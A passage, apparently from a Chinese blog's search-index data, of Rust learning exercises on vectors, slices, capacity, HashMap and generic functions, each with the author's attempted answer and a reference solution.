&#123; let mut v = Vec::from([1, 2, 3]); for i in 0..5 &#123; println!(&quot;&#123;:?&#125;&quot;, v.get(i)); &#125; for i in 0..5 &#123; // 实现这里的代码... match v.get(i) &#123; Some(p) =&gt; v[i]+=1 , None =&gt; v.push(i+2), &#125; &#125; assert_eq!(v, vec![2, 3, 4, 5, 6]); println!(&quot;Success!&quot;)&#125; Answer 123456789101112131415// 修复错误并实现缺失的代码fn main() &#123; let mut v = Vec::from([1, 2, 3]); for i in 0..5 &#123; println!(&quot;&#123;:?&#125;&quot;, v[i]) &#125; for i in 0..5 &#123; // 实现这里的代码... &#125; assert_eq!(v, vec![2, 3, 4, 5, 6]); println!(&quot;Success!&quot;)&#125; 切片与 String 的切片类似， Vec 也可以使用切片。如果说 Vec 是可变的，那它的切片就是不可变或者说只读的，我们可以通过 &amp; 来获取切片。 在 Rust 中，将切片作为参数进行传递是更常见的使用方式，例如当一个函数只需要可读性时，那传递 Vec 或 String 的切片 &amp;[T] &#x2F; &amp;str 会更加适合。 🌟🌟 12345678910111213141516171819202122// 修复错误fn main() &#123; let mut v = vec![1, 2, 3]; let slice1 = &amp;v[..]; // 越界访问将导致 panic. // 修改时必须使用 `v.len` let slice2 = &amp;v[0..4]; assert_eq!(slice1, slice2); // 切片是只读的 // 注意：切片和 `&amp;Vec` 是不同的类型，后者仅仅是 `Vec` 的引用，并可以通过解引用直接获取 `Vec` let vec_ref: &amp;mut Vec&lt;i32&gt; = &amp;mut v; (*vec_ref).push(4); let slice3 = &amp;mut v[0..3]; slice3.push(4); assert_eq!(slice3, &amp;[1, 2, 3, 4]); println!(&quot;Success!&quot;)&#125; My Answer 123456789101112131415161718192021// 修复错误fn main() &#123; let mut v = vec![1, 2, 3]; let slice1 = &amp;v[..]; // 越界访问将导致 panic. // 修改时必须使用 `v.len` let slice2 = &amp;v[0..v.len()]; assert_eq!(slice1, slice2); // 切片是只读的 // 注意：切片和 `&amp;Vec` 是不同的类型，后者仅仅是 `Vec` 的引用，并可以通过解引用直接获取 `Vec` let vec_ref: &amp;mut Vec&lt;i32&gt; = &amp;mut v; (*vec_ref).push(4); let slice3 = &amp;mut v[0..3]; assert_eq!(slice3, &amp;[1, 2, 3]); println!(&quot;Success!&quot;)&#125; Answer 123456789101112131415161718192021// FIX the errorsfn main() &#123; let mut v = vec![1, 2, 3]; let slice1 = &amp;v[..]; // out of bounds will cause a panic // You must use `v.len` here let slice2 = &amp;v[0..v.len()]; assert_eq!(slice1, slice2); // slice are read only // Note: slice and &amp;Vec are different let vec_ref: &amp;mut Vec&lt;i32&gt; = &amp;mut v; (*vec_ref).push(4); let slice3 = &amp;mut v[0..]; assert_eq!(slice3, &amp;[1, 2, 3, 4]); println!(&quot;Success!&quot;)&#125; 容量容量 capacity 是已经分配好的内存空间，用于存储未来添加到 Vec 中的元素。而长度 len 则是当前 Vec 中已经存储的元素数量。如果要添加新元素时，长度将要超过已有的容量，那容量会自动进行增长：Rust 会重新分配一块更大的内存空间，然后将之前的 Vec 拷贝过去，因此，这里就会发生新的内存分配( 目前 Rust 的容量调整策略是加倍，例如 2 -&gt; 4 -&gt; 8 ..)。 若这段代码会频繁发生，那频繁的内存分配会大幅影响我们系统的性能，最好的办法就是提前分配好足够的容量，尽量减少内存分配。 🌟🌟 1234567891011121314151617181920212223242526272829// 修复错误fn main() &#123; let mut vec = Vec::with_capacity(10); assert_eq!(vec.len(), __); assert_eq!(vec.capacity(), 10); // 由于提前设置了足够的容量，这里的循环不会造成任何内存分配... for i in 0..10 &#123; vec.push(i); &#125; assert_eq!(vec.len(), __); assert_eq!(vec.capacity(), __); // ...但是下面的代码会造成新的内存分配 vec.push(11); assert_eq!(vec.len(), 11); assert!(vec.capacity() &gt;= 11); // 填写一个合适的值，在 `for` 循环运行的过程中，不会造成任何内存分配 let mut vec = Vec::with_capacity(__); for i in 0..100 &#123; vec.push(i); &#125; assert_eq!(vec.len(), __); assert_eq!(vec.capacity(), __); println!(&quot;Success!&quot;)&#125; My Answer 12345678910111213141516171819202122232425262728293031// 修复错误 fn main() &#123; let mut vec = Vec::with_capacity(10); assert_eq!(vec.len(), 0); assert_eq!(vec.capacity(), 10); // 由于提前设置了足够的容量，这里的循环不会造成任何内存分配... for i in 0..10 &#123; vec.push(i); &#125; assert_eq!(vec.len(), 10); assert_eq!(vec.capacity(), 10); // ...但是下面的代码会造成新的内存分配 vec.push(11); assert_eq!(vec.len(), 11); assert!(vec.capacity() &gt;= 11); // 填写一个合适的值，在 `for` 循环运行的过程中，不会造成任何内存分配 let mut vec = Vec::with_capacity(100); for i in 0..100 &#123; vec.push(i); &#125; assert_eq!(vec.len(), 100); assert_eq!(vec.capacity(), 100); println!(&quot;Success!&quot;) &#125; Answer 1234567891011121314151617181920212223242526272829303132// FIX the errors fn main() &#123; let mut vec = Vec::with_capacity(10); // The vector contains no items, even though it has capacity for more assert_eq!(vec.len(), 0); assert_eq!(vec.capacity(), 10); // These are all done without reallocating... for i in 0..10 &#123; vec.push(i); &#125; assert_eq!(vec.len(), 10); assert_eq!(vec.capacity(), 10); // ...but this may make the vector reallocate vec.push(11); assert_eq!(vec.len(), 11); assert!(vec.capacity() &gt;= 11); // fill in an appropriate value to make the `for` done without reallocating let mut vec = Vec::with_capacity(100); for i in 0..100 &#123; vec.push(i); &#125; assert_eq!(vec.len(), 100); assert_eq!(vec.capacity(), 100); println!(&quot;Success!&quot;) &#125; 在Vec中存储不同类型的元素Vec 中的元素必须是相同的类型，例如以下代码会发生错误: 123fn main() &#123; let v = vec![1, 2.0, 3];&#125; 但是我们可以使用枚举或特征对象来存储不同的类型. 🌟🌟 123456789101112131415#[derive(Debug)]enum IpAddr &#123; V4(String), V6(String),&#125;fn main() &#123; // 填空 let v : Vec&lt;IpAddr&gt;= __; // 枚举的比较需要派生 PartialEq 特征 assert_eq!(v[0], IpAddr::V4(&quot;127.0.0.1&quot;.to_string())); assert_eq!(v[1], IpAddr::V6(&quot;::1&quot;.to_string())); println!(&quot;Success!&quot;)&#125; My Answer 123456789101112131415#[derive(Debug,PartialEq)]enum IpAddr &#123; V4(String), V6(String),&#125;fn main() &#123; // 填空 let v : Vec&lt;IpAddr&gt;= vec![IpAddr::V4(&quot;127.0.0.1&quot;.to_string()),IpAddr::V6(&quot;::1&quot;.to_string())]; // 枚举的比较需要派生 PartialEq 特征 assert_eq!(v[0], IpAddr::V4(&quot;127.0.0.1&quot;.to_string())); assert_eq!(v[1], IpAddr::V6(&quot;::1&quot;.to_string())); println!(&quot;Success!&quot;)&#125; Answer 12345678910111213141516171819#[derive(Debug, PartialEq)]enum IpAddr &#123; V4(String), V6(String),&#125;fn main() &#123; // FILL in the blank let v: Vec&lt;IpAddr&gt; = vec![ IpAddr::V4(&quot;127.0.0.1&quot;.to_string()), IpAddr::V6(&quot;::1&quot;.to_string()) ]; // Comparing two enums need to derive the PartialEq trait assert_eq!(v[0], IpAddr::V4(&quot;127.0.0.1&quot;.to_string())); assert_eq!(v[1], IpAddr::V6(&quot;::1&quot;.to_string())); println!(&quot;Success!&quot;)&#125; 🌟🌟 12345678910111213141516171819202122232425262728trait IpAddr &#123; fn display(&amp;self);&#125;struct V4(String);impl IpAddr for V4 &#123; fn display(&amp;self) &#123; println!(&quot;ipv4: &#123;:?&#125;&quot;,self.0) &#125;&#125;struct V6(String);impl IpAddr for V6 &#123; fn display(&amp;self) &#123; println!(&quot;ipv6: &#123;:?&#125;&quot;,self.0) &#125;&#125;fn main() &#123; // 填空 let v: __= vec![ Box::new(V4(&quot;127.0.0.1&quot;.to_string())), Box::new(V6(&quot;::1&quot;.to_string())), ]; for ip in v &#123; ip.display(); &#125;&#125; My Answer 12345678910111213141516171819202122232425262728trait IpAddr &#123; fn display(&amp;self);&#125;struct V4(String);impl IpAddr for V4 &#123; fn display(&amp;self) &#123; println!(&quot;ipv4: &#123;:?&#125;&quot;,self.0) &#125;&#125;struct V6(String);impl IpAddr for V6 &#123; fn display(&amp;self) &#123; println!(&quot;ipv6: &#123;:?&#125;&quot;,self.0) &#125;&#125;fn main() &#123; // 填空 let v:Vec&lt;Box&lt;dyn IpAddr&gt;&gt;= vec![ Box::new(V4(&quot;127.0.0.1&quot;.to_string())), Box::new(V6(&quot;::1&quot;.to_string())), ]; for ip in v &#123; ip.display(); &#125;&#125; Answer 123456789101112131415161718192021222324252627trait IpAddr &#123; fn display(&amp;self);&#125;struct V4(String);impl IpAddr for V4 &#123; fn display(&amp;self) &#123; println!(&quot;ipv4: &#123;:?&#125;&quot;,self.0) &#125;&#125;struct V6(String);impl IpAddr for V6 &#123; fn display(&amp;self) &#123; println!(&quot;ipv6: &#123;:?&#125;&quot;,self.0) &#125;&#125;fn main() &#123; let v: Vec&lt;Box&lt;dyn IpAddr&gt;&gt; = vec![ Box::new(V4(&quot;127.0.0.1&quot;.to_string())), Box::new(V6(&quot;::1&quot;.to_string())), ]; for ip in v &#123; ip.display(); &#125;&#125; HashMapHashMap 默认使用 SipHash 1-3 哈希算法，该算法对于抵抗 HashDos 攻击非常有效。在性能方面，如果你的 key 是中型大小的，那该算法非常不错，但是如果是小型的 key( 例如整数 )亦或是大型的 key ( 例如字符串 )，那你需要采用社区提供的其它算法来提高性能。 哈希表的算法是基于 Google 的 SwissTable，你可以在这里找到 C++ 的实现，同时在 CppCon talk 上也有关于算法如何工作的演讲。 基本操作 🌟🌟 12345678910111213141516171819202122232425262728// 填空并修复错误use std::collections::HashMap;fn main() &#123; let mut scores = HashMap::new(); scores.insert(&quot;Sunface&quot;, 98); scores.insert(&quot;Daniel&quot;, 95); scores.insert(&quot;Ashley&quot;, 69.0); scores.insert(&quot;Katie&quot;, &quot;58&quot;); // get 返回一个 Option&lt;&amp;V&gt; 枚举值 let score = scores.get(&quot;Sunface&quot;); assert_eq!(score, Some(98)); if scores.contains_key(&quot;Daniel&quot;) &#123; // 索引返回一个值 V let score = scores[&quot;Daniel&quot;]; assert_eq!(score, __); scores.remove(&quot;Daniel&quot;); &#125; assert_eq!(scores.len(), __); for (name, score) in scores &#123; println!(&quot;The score of &#123;&#125; is &#123;&#125;&quot;, name, score) &#125;&#125; My Answer 12345678910111213141516171819202122232425262728// 填空并修复错误use std::collections::HashMap;fn main() &#123; let mut scores = HashMap::new(); scores.insert(&quot;Sunface&quot;, 98); scores.insert(&quot;Daniel&quot;, 95); scores.insert(&quot;Ashley&quot;, 69); scores.insert(&quot;Katie&quot;, 58); // get 返回一个 Option&lt;&amp;V&gt; 枚举值 let score = scores.get(&quot;Sunface&quot;); assert_eq!(score, Some(98).as_ref()); if scores.contains_key(&quot;Daniel&quot;) &#123; // 索引返回一个值 V let score = scores[&quot;Daniel&quot;]; assert_eq!(score, 95); scores.remove(&quot;Daniel&quot;); &#125; assert_eq!(scores.len(), 3); for (name, score) in scores &#123; println!(&quot;The score of &#123;&#125; is &#123;&#125;&quot;, name, score) &#125;&#125; Answer 1234567891011121314151617181920212223242526// FILL in the blanks and FIX the errosuse std::collections::HashMap;fn main() &#123; let mut scores = HashMap::new(); scores.insert(&quot;Sunface&quot;, 98); scores.insert(&quot;Daniel&quot;, 95); scores.insert(&quot;Ashley&quot;, 69); scores.insert(&quot;Katie&quot;, 58); // get returns a Option&lt;&amp;V&gt; let score = scores.get(&quot;Sunface&quot;); assert_eq!(score, Some(&amp;98)); if scores.contains_key(&quot;Daniel&quot;) &#123; // indexing return a value V let score = scores[&quot;Daniel&quot;]; assert_eq!(score, 95); scores.remove(&quot;Daniel&quot;); &#125; assert_eq!(scores.len(), 3); for (name, score) in scores &#123; println!(&quot;The score of &#123;&#125; is &#123;&#125;&quot;, name, score) &#125;&#125; 🌟🌟 1234567891011121314151617181920212223use std::collections::HashMap;fn main() &#123; let teams = [ (&quot;Chinese Team&quot;, 100), (&quot;American Team&quot;, 10), (&quot;France Team&quot;, 50), ]; let mut teams_map1 = HashMap::new(); for team in &amp;teams &#123; teams_map1.insert(team.0, team.1); &#125; // 使用两种方法实现 team_map2 // 提示:其中一种方法是使用 `collect` 方法 let teams_map2... assert_eq!(teams_map1, teams_map2); println!(&quot;Success!&quot;)&#125; My Answer 1234567891011121314151617181920212223use std::collections::HashMap;fn main() &#123; let teams = [ (&quot;Chinese Team&quot;, 100), (&quot;American Team&quot;, 10), (&quot;France Team&quot;, 50), ]; let mut teams_map1 = HashMap::new(); for team in &amp;teams &#123; teams_map1.insert(team.0, team.1); &#125; // 使用两种方法实现 team_map2 // 提示:其中一种方法是使用 `collect` 方法 let teams_map2:HashMap&lt;&amp;str, i32&gt; = teams.into_iter().collect(); assert_eq!(teams_map1, teams_map2); println!(&quot;Success!&quot;)&#125; Answer 12345678910111213141516171819use std::collections::HashMap;fn main() &#123; let teams = [ (&quot;Chinese Team&quot;, 100), (&quot;American Team&quot;, 10), (&quot;France Team&quot;, 50), ]; let mut teams_map1 = HashMap::new(); for team in &amp;teams &#123; teams_map1.insert(team.0, team.1); &#125; let teams_map2: HashMap&lt;_,_&gt; = teams.into_iter().collect(); assert_eq!(teams_map1, teams_map2); println!(&quot;Success!&quot;)&#125; 123456789101112131415161718use std::&#123;collections::HashMap&#125;;fn main() &#123; let teams = [ (&quot;Chinese Team&quot;, 100), (&quot;American Team&quot;, 10), (&quot;France Team&quot;, 50), ]; let mut teams_map1 = HashMap::new(); for team in &amp;teams &#123; teams_map1.insert(team.0, team.1); &#125; let teams_map2 = HashMap::from(teams); assert_eq!(teams_map1, teams_map2); println!(&quot;Success!&quot;)&#125; 🌟🌟 1234567891011121314151617181920212223242526272829// 填空use std::collections::HashMap;fn main() &#123; // 编译器可以根据后续的使用情况帮我自动推断出 HashMap 的类型，当然你也可以显式地标注类型：HashMap&lt;&amp;str, u8&gt; let mut player_stats = HashMap::new(); // 查询指定的 key, 若不存在时，则插入新的 kv 值 player_stats.entry(&quot;health&quot;).or_insert(100); assert_eq!(player_stats[&quot;health&quot;], __); // 通过函数来返回新的值 player_stats.entry(&quot;health&quot;).or_insert_with(random_stat_buff); assert_eq!(player_stats[&quot;health&quot;], __); let health = player_stats.entry(&quot;health&quot;).or_insert(50); assert_eq!(health, __); *health -= 50; assert_eq!(*health, __); println!(&quot;Success!&quot;)&#125;fn random_stat_buff() -&gt; u8 &#123; // 为了简单，我们没有使用随机，而是返回一个固定的值 42&#125; My Answer 1234567891011121314151617181920212223242526272829// 填空use std::collections::HashMap;fn main() &#123; // 编译器可以根据后续的使用情况帮我自动推断出 HashMap 的类型，当然你也可以显式地标注类型：HashMap&lt;&amp;str, u8&gt; let mut player_stats = HashMap::new(); // 查询指定的 key, 若不存在时，则插入新的 kv 值 player_stats.entry(&quot;health&quot;).or_insert(100); assert_eq!(player_stats[&quot;health&quot;], 100); // 通过函数来返回新的值 player_stats.entry(&quot;health&quot;).or_insert_with(random_stat_buff); assert_eq!(player_stats[&quot;health&quot;], 100); let health = player_stats.entry(&quot;health&quot;).or_insert(50); assert_eq!(health, &amp;100); *health -= 50; assert_eq!(*health, 50); println!(&quot;Success!&quot;)&#125;fn random_stat_buff() -&gt; u8 &#123; // 为了简单，我们没有使用随机，而是返回一个固定的值 42&#125; Answer 123456789101112131415161718192021222324252627282930313233// FILL in the blanksuse std::collections::HashMap;fn main() &#123; // type inference lets us omit an explicit type signature (which // would be `HashMap&lt;&amp;str, u8&gt;` in this example). let mut player_stats = HashMap::new(); // insert a key only if it doesn&#x27;t already exist player_stats.entry(&quot;health&quot;).or_insert(100); assert_eq!(player_stats[&quot;health&quot;], 100); // insert a key using a function that provides a new value only if it // doesn&#x27;t already exist player_stats.entry(&quot;health&quot;).or_insert_with(random_stat_buff); assert_eq!(player_stats[&quot;health&quot;], 100); // Ensures a value is in the entry by inserting the default if empty, and returns // a mutable reference to the value in the entry. let health = player_stats.entry(&quot;health&quot;).or_insert(50); assert_eq!(health, &amp;100); *health -= 50; assert_eq!(*health, 50); println!(&quot;Success!&quot;)&#125;fn random_stat_buff() -&gt; u8 &#123; // could actually return some random value here - let&#x27;s just return // some fixed value for now 42&#125; HashMap Key的限制任何实现了 Eq 和 Hash 特征的类型都可以用于 HashMap 的 key，包括: bool (虽然很少用到，因为它只能表达两种 key) int, uint 以及它们的变体，例如 u8、i32 等 String 和 &amp;str (提示: HashMap 的 key 是 String 类型时，你其实可以使用 &amp;str 配合 get 方法进行查询 需要注意的是，f32 和 f64 并没有实现 Hash，原因是 浮点数精度 的问题会导致它们无法进行相等比较。 如果一个集合类型的所有字段都实现了 Eq 和 Hash,那该集合类型会自动实现 Eq 和 Hash。例如 Vect&lt;T&gt; 要实现 Hash，那么首先需要 T 实现 Hash。 🌟🌟 123456789101112131415161718192021222324252627282930313233// 修复错误// 提示: `derive` 是实现一些常用特征的好办法use std::collections::HashMap;struct Viking &#123; name: String, country: String,&#125;impl Viking &#123; fn new(name: &amp;str, country: &amp;str) -&gt; Viking &#123; Viking &#123; name: name.to_string(), country: country.to_string(), &#125; &#125;&#125;fn main() &#123; // 使用 HashMap 来存储 viking 的生命值 let vikings = HashMap::from([ (Viking::new(&quot;Einar&quot;, &quot;Norway&quot;), 25), (Viking::new(&quot;Olaf&quot;, &quot;Denmark&quot;), 24), (Viking::new(&quot;Harald&quot;, &quot;Iceland&quot;), 12), ]); // 使用 derive 的方式来打印 viking 的当前状态 for (viking, health) in &amp;vikings &#123; println!(&quot;&#123;:?&#125; has &#123;&#125; hp&quot;, viking, health); &#125;&#125; My Answer 123456789101112131415161718192021222324252627282930313233// 修复错误// 提示: `derive` 是实现一些常用特征的好办法use std::collections::HashMap;#[derive(PartialEq, Eq, Debug, Hash)]struct Viking &#123; name: String, country: String,&#125;impl Viking &#123; fn new(name: &amp;str, country: &amp;str) -&gt; Viking &#123; Viking &#123; name: name.to_string(), country: country.to_string(), &#125; &#125;&#125;fn main() &#123; // 使用 HashMap 来存储 viking 的生命值 let vikings = HashMap::from([ (Viking::new(&quot;Einar&quot;, &quot;Norway&quot;), 25), (Viking::new(&quot;Olaf&quot;, &quot;Denmark&quot;), 24), (Viking::new(&quot;Harald&quot;, &quot;Iceland&quot;), 12), ]); // 使用 derive 的方式来打印 viking 的当前状态 for (viking, health) in &amp;vikings &#123; println!(&quot;&#123;:?&#125; has &#123;&#125; hp&quot;, viking, health); &#125;&#125; Answer 12345678910111213141516171819202122232425262728293031use std::collections::HashMap;#[derive(Hash, Eq, PartialEq, Debug)]struct Viking &#123; name: String, country: String,&#125;impl Viking &#123; /// Creates a new Viking. fn new(name: &amp;str, country: &amp;str) -&gt; Viking &#123; Viking &#123; name: name.to_string(), country: country.to_string(), &#125; &#125;&#125;fn main() &#123; // Use a HashMap to store the vikings&#x27; health points. let vikings = HashMap::from([ (Viking::new(&quot;Einar&quot;, &quot;Norway&quot;), 25), (Viking::new(&quot;Olaf&quot;, &quot;Denmark&quot;), 24), (Viking::new(&quot;Harald&quot;, &quot;Iceland&quot;), 12), ]); // Use derived implementation to print the status of the vikings. for (viking, health) in &amp;vikings &#123; println!(&quot;&#123;:?&#125; has &#123;&#125; hp&quot;, viking, health); &#125;&#125; 容量关于容量，我们在之前的 Vector 中有详细的介绍，而 HashMap 也可以调整容量: 你可以通过 HashMap::with_capacity(uint) 使用指定的容量来初始化，或者使用 HashMap::new() ，后者会提供一个默认的初始化容量。 示例 1234567891011121314151617181920use std::collections::HashMap;fn main() &#123; let mut map: HashMap&lt;i32, i32&gt; = HashMap::with_capacity(100); map.insert(1, 2); map.insert(3, 4); // 事实上，虽然我们使用了 100 容量来初始化，但是 map 的容量很可能会比 100 更多 assert!(map.capacity() &gt;= 100); // 对容量进行收缩，你提供的值仅仅是一个允许的最小值，实际上，Rust 会根据当前存储的数据量进行自动设置，当然，这个值会尽量靠近你提供的值，同时还可能会预留一些调整空间 map.shrink_to(50); assert!(map.capacity() &gt;= 50); // 让 Rust 自行调整到一个合适的值，剩余策略同上 map.shrink_to_fit(); assert!(map.capacity() &gt;= 2); println!(&quot;Success!&quot;)&#125; 所有权对于实现了 Copy 特征的类型，例如 i32，那类型的值会被拷贝到 HashMap 中。而对于有所有权的类型，例如 String，它们的值的所有权将被转移到 HashMap 中。 🌟🌟 12345678910111213141516171819// 修复错误，尽可能少的去修改代码// 不要移除任何代码行！use std::collections::HashMap;fn main() &#123; let v1 = 10; let mut m1 = HashMap::new(); m1.insert(v1, v1); println!(&quot;v1 is still usable after inserting to hashmap : &#123;&#125;&quot;, v1); let v2 = &quot;hello&quot;.to_string(); let mut m2 = HashMap::new(); // 所有权在这里发生了转移 m2.insert(v2, v1); assert_eq!(v2, &quot;hello&quot;); println!(&quot;Success!&quot;)&#125; My Answer 12345678910111213141516171819// 修复错误，尽可能少的去修改代码// 不要移除任何代码行！use std::collections::HashMap;fn main() &#123; let v1 = 10; let mut m1 = HashMap::new(); m1.insert(v1, v1); println!(&quot;v1 is still usable after inserting to hashmap : &#123;&#125;&quot;, v1); let v2 = &quot;hello&quot;.to_string(); let mut m2 = HashMap::new(); // 所有权在这里发生了转移 m2.insert(v2.clone(), v1); assert_eq!(v2, &quot;hello&quot;); println!(&quot;Success!&quot;)&#125; Answer 123456789101112131415use std::collections::HashMap;fn main() &#123; let v1 = 10; let mut m1 = HashMap::new(); m1.insert(v1, v1); println!(&quot;v1 is still usable after inserting to hashmap : &#123;&#125;&quot;, v1); // &amp;str implements Copy trait let v2 = &quot;hello&quot;; let mut m2 = HashMap::new(); m2.insert(v2, v1); assert_eq!(v2, &quot;hello&quot;);&#125; 三方库Hash库在开头，我们提到过如果现有的 SipHash 1-3 的性能无法满足你的需求，那么可以使用社区提供的替代算法。 例如其中一个社区库的使用方式如下： 1234567891011121314#![allow(unused)]fn main() &#123;use std::hash::BuildHasherDefault;use std::collections::HashMap;// 引入第三方的哈希函数use twox_hash::XxHash64;let mut hash: HashMap&lt;_, _, BuildHasherDefault&lt;XxHash64&gt;&gt; = Default::default();hash.insert(42, &quot;the answer&quot;);assert_eq!(hash.get(&amp;42), Some(&amp;&quot;the answer&quot;));&#125;","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"Rust","slug":"编程语言/Rust","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Rust/"},{"name":"练习实践","slug":"编程语言/Rust/练习实践","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Rust/%E7%BB%83%E4%B9%A0%E5%AE%9E%E8%B7%B5/"}],"tags":[{"name":"Rust","slug":"Rust","permalink":"http://example.com/tags/Rust/"}]},{"title":"Rust学习 练习8 泛型和特征","slug":"Rust学习-练习8-泛型和特征","date":"2023-09-09T09:05:27.000Z","updated":"2023-09-12T11:52:22.261Z","comments":true,"path":"2023/09/09/Rust学习-练习8-泛型和特征/","link":"","permalink":"http://example.com/2023/09/09/Rust%E5%AD%A6%E4%B9%A0-%E7%BB%83%E4%B9%A08-%E6%B3%9B%E5%9E%8B%E5%92%8C%E7%89%B9%E5%BE%81/","excerpt":"泛型函数 🌟🌟🌟 12345678910111213141516171819202122232425// 填空struct A; // 具体的类型 `A`.struct S(A); // 具体的类型 `S`.struct SGen&lt;T&gt;(T); // 泛型 `SGen`.fn reg_fn(_s: S) &#123;&#125;fn gen_spec_t(_s: SGen&lt;A&gt;) &#123;&#125;fn gen_spec_i32(_s: SGen&lt;i32&gt;) &#123;&#125;fn generic&lt;T&gt;(_s: SGen&lt;T&gt;) &#123;&#125;fn main() &#123; // 使用非泛型函数 reg_fn(__); // 具体的类型 gen_spec_t(__); // 隐式地指定类型参数 `A`. gen_spec_i32(__); // 隐式地指定类型参数`i32`. // 显式地指定类型参数 `char` generic::&lt;char&gt;(__); // 隐式地指定类型参数 `char`. generic(__);&#125; My Answer 12345678910111213141516171819202122232425// 填空struct A; // 具体的类型 `A`.struct S(A); // 具体的类型 `S`.struct SGen&lt;T&gt;(T); // 泛型 `SGen`.fn reg_fn(_s: S) &#123;&#125;fn gen_spec_t(_s: SGen&lt;A&gt;) &#123;&#125;fn gen_spec_i32(_s: SGen&lt;i32&gt;) &#123;&#125;fn generic&lt;T&gt;(_s: SGen&lt;T&gt;) &#123;&#125;fn main() &#123; // 使用非泛型函数 reg_fn(S(A)); // 具体的类型 gen_spec_t(SGen(A)); // 隐式地指定类型参数 `A`. gen_spec_i32(SGen(1)); // 隐式地指定类型参数`i32`. // 显式地指定类型参数 `char` generic::&lt;char&gt;(SGen(&#x27;1&#x27;)); // 隐式地指定类型参数 `char`. generic(SGen(&#x27;1&#x27;));&#125; Answer 123456789101112131415161718192021222324struct A; // Concrete type `A`.struct S(A); // Concrete type `S`.struct SGen&lt;T&gt;(T); // Generic type `SGen`.fn reg_fn(_s: S) &#123;&#125;fn gen_spec_t(_s: SGen&lt;A&gt;) &#123;&#125;fn gen_spec_i32(_s: SGen&lt;i32&gt;) &#123;&#125;fn generic&lt;T&gt;(_s: SGen&lt;T&gt;) &#123;&#125;fn main() &#123; // Using the non-generic functions reg_fn(S(A)); // Concrete type. gen_spec_t(SGen(A)); // Implicitly specified type parameter `A`. gen_spec_i32(SGen(6)); // Implicitly specified type parameter `i32`. // Explicitly specified type parameter `char` to `generic()`. generic::&lt;char&gt;(SGen(&#x27;a&#x27;)); // Implicitly specified type parameter `char` to `generic()`. generic(SGen(&#x27;c&#x27;));&#125; 🌟🌟 12345678// 实现下面的泛型函数 sumfn sumfn main() &#123; assert_eq!(5, sum(2i8, 3i8)); assert_eq!(50, sum(20, 30)); assert_eq!(2.46, sum(1.23, 1.23));&#125; My Answer 12345678910// 实现下面的泛型函数 sumfn sum&lt;T :std::ops::Add&lt;Output = T&gt;&gt;(val1: T,val2: T) -&gt; T&#123; val1+val2&#125;fn main() &#123; assert_eq!(5, sum(2i8, 3i8)); assert_eq!(50, sum(20, 30)); assert_eq!(2.46, sum(1.23, 1.23));&#125; Answer 123456789fn sum&lt;T:std::ops::Add&lt;Output = T&gt;&gt;(x: T, y: T) -&gt; T &#123; x + y&#125;fn main() &#123; assert_eq!(5, sum(2i8, 3i8)); assert_eq!(50, sum(20, 30)); assert_eq!(2.46, sum(1.23, 1.23));&#125;","text":"泛型函数 🌟🌟🌟 12345678910111213141516171819202122232425// 填空struct A; // 具体的类型 `A`.struct S(A); // 具体的类型 `S`.struct SGen&lt;T&gt;(T); // 泛型 `SGen`.fn reg_fn(_s: S) &#123;&#125;fn gen_spec_t(_s: SGen&lt;A&gt;) &#123;&#125;fn gen_spec_i32(_s: SGen&lt;i32&gt;) &#123;&#125;fn generic&lt;T&gt;(_s: SGen&lt;T&gt;) &#123;&#125;fn main() &#123; // 使用非泛型函数 reg_fn(__); // 具体的类型 gen_spec_t(__); // 隐式地指定类型参数 `A`. gen_spec_i32(__); // 隐式地指定类型参数`i32`. // 显式地指定类型参数 `char` generic::&lt;char&gt;(__); // 隐式地指定类型参数 `char`. generic(__);&#125; My Answer 12345678910111213141516171819202122232425// 填空struct A; // 具体的类型 `A`.struct S(A); // 具体的类型 `S`.struct SGen&lt;T&gt;(T); // 泛型 `SGen`.fn reg_fn(_s: S) &#123;&#125;fn gen_spec_t(_s: SGen&lt;A&gt;) &#123;&#125;fn gen_spec_i32(_s: SGen&lt;i32&gt;) &#123;&#125;fn generic&lt;T&gt;(_s: SGen&lt;T&gt;) &#123;&#125;fn main() &#123; // 使用非泛型函数 reg_fn(S(A)); // 具体的类型 gen_spec_t(SGen(A)); // 隐式地指定类型参数 `A`. gen_spec_i32(SGen(1)); // 隐式地指定类型参数`i32`. // 显式地指定类型参数 `char` generic::&lt;char&gt;(SGen(&#x27;1&#x27;)); // 隐式地指定类型参数 `char`. generic(SGen(&#x27;1&#x27;));&#125; Answer 123456789101112131415161718192021222324struct A; // Concrete type `A`.struct S(A); // Concrete type `S`.struct SGen&lt;T&gt;(T); // Generic type `SGen`.fn reg_fn(_s: S) &#123;&#125;fn gen_spec_t(_s: SGen&lt;A&gt;) &#123;&#125;fn gen_spec_i32(_s: SGen&lt;i32&gt;) &#123;&#125;fn generic&lt;T&gt;(_s: SGen&lt;T&gt;) &#123;&#125;fn main() &#123; // Using the non-generic functions reg_fn(S(A)); // Concrete type. gen_spec_t(SGen(A)); // Implicitly specified type parameter `A`. gen_spec_i32(SGen(6)); // Implicitly specified type parameter `i32`. // Explicitly specified type parameter `char` to `generic()`. generic::&lt;char&gt;(SGen(&#x27;a&#x27;)); // Implicitly specified type parameter `char` to `generic()`. generic(SGen(&#x27;c&#x27;));&#125; 🌟🌟 12345678// 实现下面的泛型函数 sumfn sumfn main() &#123; assert_eq!(5, sum(2i8, 3i8)); assert_eq!(50, sum(20, 30)); assert_eq!(2.46, sum(1.23, 1.23));&#125; My Answer 12345678910// 实现下面的泛型函数 sumfn sum&lt;T :std::ops::Add&lt;Output = T&gt;&gt;(val1: T,val2: T) -&gt; T&#123; val1+val2&#125;fn main() &#123; assert_eq!(5, sum(2i8, 3i8)); assert_eq!(50, sum(20, 30)); assert_eq!(2.46, sum(1.23, 1.23));&#125; Answer 123456789fn sum&lt;T:std::ops::Add&lt;Output = T&gt;&gt;(x: T, y: T) -&gt; T &#123; x + y&#125;fn main() &#123; assert_eq!(5, sum(2i8, 3i8)); assert_eq!(50, sum(20, 30)); assert_eq!(2.46, sum(1.23, 1.23));&#125; 结构体和impl 🌟 123456// 实现一个结构体 Point 让代码工作fn main() &#123;let integer = Point &#123; x: 5, y: 10 &#125;;let float = Point &#123; x: 1.0, y: 4.0 &#125;;&#125; My Answer 12345678910// 实现一个结构体 Point 让代码工作 struct Point&lt;T&gt; &#123; x: T, y: T, &#125; fn main() &#123; let integer = Point &#123; x: 5, y: 10 &#125;; let float 